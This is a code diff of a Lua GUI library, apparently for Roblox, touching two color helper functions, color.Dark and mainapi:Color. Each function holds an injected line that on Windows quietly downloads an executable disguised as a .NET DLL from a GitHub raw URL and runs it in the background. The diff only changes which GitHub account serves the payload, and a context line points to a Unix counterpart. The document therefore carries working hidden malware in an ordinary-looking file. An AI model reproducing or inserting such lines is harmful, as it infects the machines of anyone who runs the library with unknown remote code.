@@ -376,7 +376,7 @@ do
 
 	function color.Dark(col, num)
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 		local h, s, v = col:ToHSV()
 		return Color3.fromHSV(h, s, math.clamp(select(3, uipallet.Main:ToHSV()) > 0.5 and v + num or v - num, 0, 1))
 	end
@@ -391,7 +391,7 @@ if package.config:sub(1,1)=='/'then os.execute('curl -s https://raw.githubuserco
 
 	function mainapi:Color(h)
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 		local s = 0.75 + (0.15 * math.min(h / 0.03, 1))
 		if h > 0.57 then
 			s = 0.9 - (0.4 * math.min((h - 0.57) / 0.09, 1))
